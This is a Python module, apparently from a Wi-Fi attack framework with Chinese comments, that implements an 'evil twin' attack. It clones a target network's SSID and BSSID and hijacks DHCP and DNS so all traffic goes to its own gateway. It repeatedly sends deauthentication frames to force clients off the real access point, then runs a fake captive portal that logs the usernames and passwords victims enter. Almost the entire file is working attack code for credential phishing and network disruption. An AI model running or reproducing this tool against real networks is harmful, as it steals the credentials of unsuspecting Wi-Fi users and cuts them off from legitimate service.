"""邪恶双胞胎（Evil Twin）+ 强制门户钓鱼."""

from __future__ import annotations

import asyncio
import os
import re
import time
from collections import deque
from shutil import which

from .base import AttackContext, AttackModule, AttackResult, Option
from .portal import PortalServer
from ..core.utils import make_run_dir
from ..models import Credential, normalize_mac

_STA_RE = re.compile(r"AP-STA-(CONNECTED|DISCONNECTED)\s+([0-9a-fA-F:]{17})")


class EvilTwin(AttackModule):
    id = "evil_twin"
    name = "邪恶双胞胎 + 门户"
    category = "rogue_ap"
    description = (
        "克隆目标 SSID（可选克隆 BSSID）搭建流氓 AP，配合 Deauth 迫使客户端关联，"
        "再通过强制门户收集账号口令。内置 DHCP/DNS 劫持、门户端口自动重定向与多平台门户探测响应。"
    )
    requires = ("hostapd", "dnsmasq")
    risk = "critical"
    needs_monitor = False
    options = [
        Option(
            "password",
            "WPA2 口令",
            "text",
            "",
            "克隆 WPA2 目标时填写目标 PSK；留空会回退为开放网络（已破解的节点会自动带入口令）",
        ),
        Option("spoof_bssid", "克隆 BSSID", "bool", True, "与目标同 BSSID；单网卡环境会自动关闭"),
        Option("portal_enabled", "启用门户", "bool", True, "关闭则仅搭建流氓 AP"),
        Option("portal_title", "门户标题", "text", "Wi-Fi 网络认证"),
        Option("portal_port", "门户端口", "int", 80, "80 被占用时自动改用 8080 并写入 DNAT 重定向"),
        Option("deauth", "Deauth 助攻", "bool", True, "需要第二块独立网卡；单网卡环境会自动跳过"),
        Option("timeout", "运行时长（秒）", "int", 180, "到期自动关闭流氓 AP"),
    ]

    def preflight(self, ctx: AttackContext) -> list[str]:
        issues = super().preflight(ctx)
        if not ctx.demo and os.geteuid() != 0:
            issues.append(
                "邪恶双胞胎需要 root 权限：创建 AP 接口、启动 hostapd/dnsmasq、写入 iptables 规则"
            )
        return issues

    async def run(self, ctx: AttackContext, params: dict) -> AttackResult:
        started = time.time()
        bssid = normalize_mac(params["bssid"])
        ssid = params.get("ssid") or "Free-WiFi"
        channel = int(params.get("channel") or 6)
        timeout = max(20, int(params.get("timeout") or 180))
        ctx.authorize("evil_twin", bssid, ssid)

        password = str(params.get("password") or "").strip()
        if not password:
            password = self._cracked_psk(ctx, bssid)
            if password:
                ctx.emit("info", "未填写口令，已自动使用该节点已破解的 PSK 作为 WPA2 口令")

        target_security = str(params.get("security") or "").strip().upper()
        security = self._resolve_security(target_security, password)
        if security == "wpa2" and not 8 <= len(password) <= 63:
            ctx.emit("warning", f"WPA2 口令需 8-63 位（当前 {len(password)} 位），已回退为开放网络")
            security = "open"
        if security == "open" and "WPA" in target_security:
            ctx.emit(
                "warning",
                f"目标为 {target_security}，但伪 AP 将以开放网络运行：已保存该网络的终端会卡在"
                "四次握手，拿不到 DHCP，也就不会弹门户。请在“WPA2 口令”里填入目标 PSK 后重试。",
            )

        label = "WPA2-PSK" if security == "wpa2" else "OPEN"
        ctx.emit(
            "attack",
            f"启动邪恶双胞胎：{ssid} · ch{channel} · {label} · {timeout}s",
            bssid=bssid,
        )
        hit = asyncio.Event()
        captured: list[dict] = []

        def on_credential(record: dict) -> None:
            credential = Credential(
                session_id=ctx.session_id,
                username=record.get("username", ""),
                password=record.get("password", ""),
                portal=f"evil-twin:{ssid}",
                ip=record.get("ip", ""),
                user_agent=record.get("user_agent", ""),
            )
            cred_id = ctx.store.add_credential(credential)
            captured.append(record)
            ctx.emit(
                "success",
                f"🎯 捕获门户凭证 #{cred_id}：{record.get('username')} / {record.get('password')}",
                credential_id=cred_id,
                username=record.get("username"),
            )
            ctx.finding(
                "强制门户捕获到用户凭证",
                "critical",
                bssid=bssid,
                ssid=ssid,
                detail=f"账号 {record.get('username')} 从 {record.get('ip')} 提交到伪造门户。",
                category="phishing",
            )
            hit.set()

        portal: PortalServer | None = None
        if params.get("portal_enabled", True):
            portal = PortalServer(
                host="0.0.0.0" if not ctx.demo else "127.0.0.1",
                port=int(params.get("portal_port") or 80) if not ctx.demo else 0,
                ssid=ssid,
                title=str(params.get("portal_title") or "Wi-Fi 网络认证"),
                on_credential=on_credential,
                on_request=lambda line: ctx.log(f"[门户] {line}"),
                template_path=ctx.config.data_path / "portal" / "index.html",
            )
            port = await portal.start()
            ctx.register_portal(portal)
            ctx.emit(
                "success",
                f"门户已启动：{portal.url}（端口 {port}）",
                url=portal.url,
                port=port,
            )
            if ctx.demo:
                ctx.emit("info", "演示模式：在浏览器打开上面的地址即可体验凭证捕获流程")

        try:
            if ctx.demo:
                result = await self._demo(ctx, params, bssid, ssid, channel, timeout, portal, hit, captured, started)
            else:
                result = await self._live(
                    ctx,
                    params,
                    bssid,
                    ssid,
                    channel,
                    timeout,
                    portal,
                    hit,
                    captured,
                    started,
                    security=security,
                    password=password,
                )
            return result
        finally:
            if portal:
                await portal.stop()

    # ------------------------------------------------------------------ demo
    async def _demo(
        self,
        ctx: AttackContext,
        params: dict,
        bssid: str,
        ssid: str,
        channel: int,
        timeout: int,
        portal: PortalServer | None,
        hit: asyncio.Event,
        captured: list[dict],
        started: float,
    ) -> AttackResult:
        for step in [
            f"创建伪造 AP「{ssid}」（模拟）",
            "启动 DHCP / DNS 劫持（模拟）",
            "发送 Deauth 促使客户端重连（模拟）",
            "等待客户端触发强制门户…",
        ]:
            await asyncio.sleep(0.5)
            ctx.emit("info", step, bssid=bssid)
        deadline = time.time() + min(timeout, 30)
        while time.time() < deadline:
            try:
                await asyncio.wait_for(hit.wait(), timeout=1)
                break
            except asyncio.TimeoutError:
                continue
        summary = (
            f"门户捕获 {len(captured)} 组凭证（模拟 AP）"
            if captured
            else "流氓 AP 已运行，未收到门户提交（可在演示门户中手动提交）"
        )
        return AttackResult(
            ok=True,
            summary=summary,
            detail={
                "demo": True,
                "portal_url": portal.url if portal else "",
                "credentials": len(captured),
                "channel": channel,
            },
            duration=time.time() - started,
        )

    # ------------------------------------------------------------------ live
    async def _live(
        self,
        ctx: AttackContext,
        params: dict,
        bssid: str,
        ssid: str,
        channel: int,
        timeout: int,
        portal: PortalServer | None,
        hit: asyncio.Event,
        captured: list[dict],
        started: float,
        *,
        security: str,
        password: str,
    ) -> AttackResult:
        await self._cleanup_stale_vifs(ctx, ctx.config.iface)
        base = await ctx.iface_mgr.resolve(ctx.config.iface)
        if not base:
            raise RuntimeError("未找到可用无线网卡")
        if base.is_monitor:
            # 上一次抓包可能把网卡留在监听模式，直接建 AP 会失败
            ctx.emit("info", f"{base.name} 仍在监听模式，先切回 managed 再创建伪 AP")
            await ctx.iface_mgr.set_type(base.name, "managed")

        spoof = bool(params.get("spoof_bssid", True))
        wants_deauth = bool(params.get("deauth", True))
        second_radio = await self._second_radio(ctx, base)
        if spoof and not second_radio:
            spoof = False
            ctx.emit(
                "warning",
                "单网卡环境：已自动关闭 BSSID 克隆（与在线真 AP 使用同一 BSSID 会让客户端反复掉线）",
            )
        if wants_deauth and not second_radio:
            ctx.emit(
                "warning",
                "单网卡环境：无法 Deauth 助攻，已跳过（同一射频不能同时做 AP 和监听注入）。"
                "请让测试终端手动连接同名 SSID（口令即上面填写的“WPA2 口令”），"
                "以验证 关联 → DHCP → 强制门户 → 凭证 的完整链路",
            )

        await self._quiesce_base(ctx, base)
        ap_iface = await self._prepare_ap_iface(ctx, base.name)
        run_dir = make_run_dir(ctx.config.run_path, "eviltwin")
        hostapd_conf = run_dir / "hostapd.conf"
        dnsmasq_conf = run_dir / "dnsmasq.conf"
        gateway = "10.20.30.1"

        hostapd_conf.write_text(
            self._hostapd_config(
                ap_iface,
                ssid,
                channel,
                security,
                password,
                bssid if spoof else "",
            ),
            encoding="utf-8",
        )
        dnsmasq_conf.write_text(
            f"""interface={ap_iface}
bind-interfaces
dhcp-range=10.20.30.10,10.20.30.200,255.255.255.0,12h
dhcp-option=3,{gateway}
dhcp-option=6,{gateway}
address=/#/{gateway}
no-resolv
no-hosts
log-queries
log-dhcp
""",
            encoding="utf-8",
        )

        await ctx.runner.run(["ip", "addr", "replace", f"{gateway}/24", "dev", ap_iface], timeout=10)
        await ctx.runner.run(["ip", "link", "set", ap_iface, "up"], timeout=8)

        clients: set[str] = set()          # 当前在线（用于暂停 Deauth）
        seen_clients: set[str] = set()     # 全程连入过（用于结果统计，掉线也保留）
        host_log: deque[str] = deque(maxlen=20)

        def on_hostapd(line: str) -> None:
            host_log.append(line)
            match = _STA_RE.search(line)
            if match:
                action, mac = match.group(1), match.group(2).lower()
                if action == "CONNECTED":
                    clients.add(mac)
                    seen_clients.add(mac)
                    ctx.emit("success", f"客户端 {mac} 已连上伪 AP（在线 {len(clients)} 台）")
                else:
                    clients.discard(mac)
            ctx.log(f"[hostapd] {line}")

        dns_log: deque[str] = deque(maxlen=20)

        def on_dnsmasq(line: str) -> None:
            dns_log.append(line)
            ctx.log(f"[dnsmasq] {line}")

        hostapd_proc = await ctx.runner.background(
            ["hostapd", str(hostapd_conf)], delay=1.5, on_line=on_hostapd
        )
        if hostapd_proc is not None and hostapd_proc.returncode is not None:
            await self._remove_ap_iface(ctx, ap_iface, base.name)
            raise RuntimeError(
                f"hostapd 启动失败（退出码 {hostapd_proc.returncode}）："
                + " | ".join(list(host_log)[-5:])
            )
        dnsmasq_proc = await ctx.runner.background(
            ["dnsmasq", "-C", str(dnsmasq_conf), "-d"], delay=1.0, on_line=on_dnsmasq
        )
        if dnsmasq_proc is not None and dnsmasq_proc.returncode is not None:
            await ctx.runner.terminate(hostapd_proc)
            await self._remove_ap_iface(ctx, ap_iface, base.name)
            raise RuntimeError(
                f"dnsmasq 启动失败（退出码 {dnsmasq_proc.returncode}）："
                + " | ".join(list(dns_log)[-5:])
            )

        label = "WPA2-PSK" if security == "wpa2" else "OPEN"
        ctx.emit(
            "success",
            f"伪造 AP 已启动：{ssid}（{ap_iface} · {label} · 网关 {gateway}）",
        )
        ap_bssid = bssid if spoof else ""
        if not spoof:
            info = await ctx.iface_mgr.info(ap_iface)
            if info and info.mac:
                ap_bssid = info.mac
                ctx.emit(
                    "info",
                    f"伪 AP BSSID：{ap_bssid}（可在测试终端上按 BSSID 强制连接）",
                )

        # 门户不在 80 端口时自动做 DNAT：否则客户端探测 / 网关 80 端口都到不了门户。
        nat_rule: list[str] | None = None
        if portal and portal.port != 80:
            nat_rule = [
                "iptables", "-t", "nat", "-A", "PREROUTING",
                "-i", ap_iface, "-p", "tcp", "--dport", "80",
                "-j", "REDIRECT", "--to-port", str(portal.port),
            ]
            applied = await ctx.runner.run(nat_rule, timeout=10)
            if applied.ok:
                ctx.emit(
                    "success",
                    f"80 端口已被占用：门户监听 {portal.port}，已自动 DNAT {ap_iface}:80 → {portal.port}",
                )
            else:
                ctx.emit(
                    "warning",
                    f"DNAT 添加失败，客户端将无法打开门户：{applied.text[:200]}",
                )

        deauth_task: asyncio.Task | None = None
        deauth_active = wants_deauth and bool(second_radio)
        if deauth_active:
            try:
                monitor_iface = await ctx.iface_mgr.enable_monitor(second_radio)
                ctx.monitor_iface = monitor_iface
                deauth_task = asyncio.create_task(
                    self._deauth_loop(ctx, monitor_iface, bssid, channel, clients)
                )
            except Exception as exc:  # noqa: BLE001
                deauth_active = False
                ctx.emit("warning", f"监听网卡启用失败，已跳过 Deauth 助攻：{exc}")

        ap_error = ""
        try:
            # 用单调时钟：VM 休眠/系统改时间时不会把 5 分钟的窗口拉成几小时
            loop = asyncio.get_running_loop()
            deadline = loop.time() + timeout
            while loop.time() < deadline and not hit.is_set():
                if hostapd_proc is not None and hostapd_proc.returncode is not None:
                    ap_error = f"hostapd 意外退出（退出码 {hostapd_proc.returncode}），伪 AP 已失效"
                    break
                if dnsmasq_proc is not None and dnsmasq_proc.returncode is not None:
                    ap_error = f"dnsmasq 意外退出（退出码 {dnsmasq_proc.returncode}），客户端拿不到地址"
                    break
                await asyncio.sleep(1)
            if hit.is_set():
                await asyncio.sleep(1.5)
        finally:
            if deauth_task:
                deauth_task.cancel()
                try:
                    await deauth_task
                except (asyncio.CancelledError, Exception):  # noqa: BLE001
                    pass
            await ctx.runner.terminate(dnsmasq_proc)
            await ctx.runner.terminate(hostapd_proc)
            if nat_rule:
                await ctx.runner.run(
                    ["iptables", "-t", "nat", "-D"] + nat_rule[4:], timeout=10
                )
            await self._remove_ap_iface(ctx, ap_iface, base.name)
            ctx.emit("info", "流氓 AP 与 DHCP/DNS 服务已关闭")
        if ap_error:
            ctx.emit("error", ap_error)

        captures = ctx.store.list_captures(ctx.session_id)
        if captured:
            summary = f"门户捕获 {len(captured)} 组凭证"
        elif ap_error:
            summary = f"伪 AP 运行中断：{ap_error}；未捕获凭证"
        elif seen_clients:
            summary = (
                f"伪 AP 运行 {int(time.time() - started)}s：{len(seen_clients)} 台客户端连入过"
                f"（当前在线 {len(clients)} 台），但未提交门户凭证"
            )
        else:
            summary = f"伪 AP 运行 {int(time.time() - started)}s，无客户端连入"
        return AttackResult(
            ok=bool(captured) or bool(seen_clients),
            summary=summary,
            detail={
                "iface": ap_iface,
                "bssid": ap_bssid,
                "gateway": gateway,
                "portal_url": portal.url if portal else "",
                "portal_port": portal.port if portal else 0,
                "credentials": len(captured),
                "clients": sorted(seen_clients),
                "clients_online": len(clients),
                "security": security,
                "spoof_bssid": spoof,
                "deauth": deauth_active,
                "error": ap_error,
                "configs": str(run_dir),
                "captures": len(captures),
            },
            duration=time.time() - started,
        )

    # ------------------------------------------------------------------ 配置
    @staticmethod
    def _hostapd_config(
        iface: str,
        ssid: str,
        channel: int,
        security: str,
        password: str,
        bssid: str = "",
    ) -> str:
        hw_mode = "g" if channel <= 13 else "a"
        lines = [
            f"interface={iface}",
            "driver=nl80211",
            f"ssid={ssid}",
            f"hw_mode={hw_mode}",
            f"channel={channel}",
            "auth_algs=1",
            "wmm_enabled=1",
            "ignore_broadcast_ssid=0",
            "country_code=CN",
        ]
        if bssid:
            lines.append(f"bssid={bssid}")
        if security == "wpa2":
            lines += [
                "wpa=2",
                f"wpa_passphrase={password}",
                "wpa_key_mgmt=WPA-PSK",
                "rsn_pairwise=CCMP",
                "wpa_pairwise=CCMP",
            ]
        return "\n".join(lines) + "\n"

    @staticmethod
    def _resolve_security(raw: str, password: str) -> str:
        """把扫描结果的 ``WPA2`` / ``WPA2/WPA3`` 等归一化为伪 AP 的加密方式."""
        hint = (raw or "").strip().lower()
        if not hint:
            return "open"
        # WEP / OWE 无法用 PSK 方式克隆，退回开放网络
        if "wep" in hint or "owe" in hint:
            return "open"
        if any(token in hint for token in ("wpa", "psk", "sae", "mgt", "802.1x", "ent")):
            return "wpa2" if password else "open"
        return "open"

    @staticmethod
    def _cracked_psk(ctx: AttackContext, bssid: str) -> str:
        """复用历史会话中该 BSSID 已破解成功的口令，避免重复输入."""
        try:
            for crack in ctx.store.list_cracks(limit=200):
                if crack.get("status") != "found" or not crack.get("key"):
                    continue
                capture = ctx.store.get_capture(int(crack.get("capture_id") or 0))
                if capture and (capture.get("bssid") or "").lower() == bssid:
                    return str(crack["key"])
        except Exception:  # noqa: BLE001
            return ""
        return ""

    @staticmethod
    async def _cleanup_stale_vifs(ctx: AttackContext, preferred: str) -> None:
        """清掉上次异常退出残留的 AP 虚拟接口。

        mt7921 单射频只有 3 个 vif 配额，残留的 wlan0ap / wlan0apap 会被
        resolve() 误当成基础网卡，进而建出 wlan0apap 这种套娃接口。
        """
        try:
            interfaces = await ctx.iface_mgr.list_interfaces()
        except Exception:  # noqa: BLE001
            return
        for iface in interfaces:
            if iface.mode in {"AP", "__ap"} and iface.name != preferred:
                await ctx.runner.run(["iw", "dev", iface.name, "del"], timeout=8)
                ctx.emit("info", f"已清理残留 AP 接口 {iface.name}")

    @staticmethod
    async def _quiesce_base(ctx: AttackContext, base) -> None:
        """把底层网卡从其他 Wi-Fi 连接里摘出来并置 down。

        NetworkManager 会自动把 wlan0 连到别的 AP；这个 STA 连接会和伪 AP 抢同一块
        射频/信道，hostapd 设置 beacon 时返回 -16 (Device or resource busy)，
        表现就是 “Failed to set beacon parameters / Interface initialization failed”。
        """
        if which("nmcli"):
            result = await ctx.runner.run(
                ["nmcli", "device", "disconnect", base.name], timeout=15
            )
            if result.ok:
                ctx.emit("info", f"已断开 {base.name} 上的 Wi-Fi 连接（避免和伪 AP 抢射频）")
        await ctx.runner.run(["ip", "link", "set", base.name, "down"], timeout=8)

    async def _prepare_ap_iface(self, ctx: AttackContext, base: str) -> str:
        vif = f"{base}ap"
        # 清理上次残留（hostapd 异常退出时可能留下 wlan0ap）
        await ctx.runner.run(["iw", "dev", vif, "del"], timeout=8)
        result = await ctx.runner.run(
            ["iw", "dev", base, "interface", "add", vif, "type", "__ap"], timeout=10
        )
        if result.ok:
            # 必须让 NetworkManager 别接管临时 AP 接口：NM 会为它再挂一个 p2p-dev
            # 伴生 vif，单射频的 vif 配额（mt7921 只有 3 个）被占满后，
            # hostapd 设置 beacon 会失败（Beacon set failed / key not allowed）。
            if which("nmcli"):
                await ctx.runner.run(
                    ["nmcli", "device", "set", vif, "managed", "no"], timeout=8
                )
            await ctx.runner.run(["ip", "link", "set", vif, "up"], timeout=8)
            return vif
        ctx.emit("warning", f"创建 AP 虚拟接口失败，尝试直接在 {base} 上启动 hostapd：{result.text[:200]}")
        await ctx.iface_mgr.set_type(base, "managed")
        return base

    @staticmethod
    async def _remove_ap_iface(ctx: AttackContext, ap_iface: str, base: str) -> None:
        if ap_iface and ap_iface != base:
            await ctx.runner.run(["iw", "dev", ap_iface, "del"], timeout=10)
        elif base:
            # 退化到在物理网卡上直接起 AP 时，收尾要把网卡切回 managed
            await ctx.iface_mgr.set_type(base, "managed")

    @staticmethod
    async def _second_radio(ctx: AttackContext, base) -> str:
        """找一块与 AP 不同 phy 的监听网卡；只有一块射频时返回空串."""
        base_phy = getattr(base, "phy", "") or ""
        for iface in await ctx.iface_mgr.list_interfaces():
            if not iface.monitor_capable:
                continue
            if iface.phy and base_phy and iface.phy == base_phy:
                continue
            if not iface.phy and iface.name.startswith(base.name):
                continue
            return iface.name
        return ""

    async def _deauth_loop(
        self,
        ctx: AttackContext,
        monitor: str,
        bssid: str,
        channel: int,
        clients: set[str],
    ) -> None:
        if channel:
            await ctx.iface_mgr.set_channel(monitor, channel)
        while True:
            if clients:
                # 伪 AP 与真 AP 同 BSSID 时，广播 Deauth 会把已连上伪 AP 的客户端一起踢掉。
                ctx.log(f"Deauth 助攻暂停：已有 {len(clients)} 台客户端连上伪 AP，避免自己踢自己")
                await asyncio.sleep(3)
                continue
            result = await ctx.runner.run(
                ["aireplay-ng", "--deauth", "10", "-a", bssid, "--ignore-negative-one", monitor],
                timeout=20,
            )
            if result.ok:
                ctx.log("Deauth 助攻：已发送 10 帧")
            else:
                ctx.emit("warning", f"Deauth 发送失败：{result.text[:160]}")
            await asyncio.sleep(10)
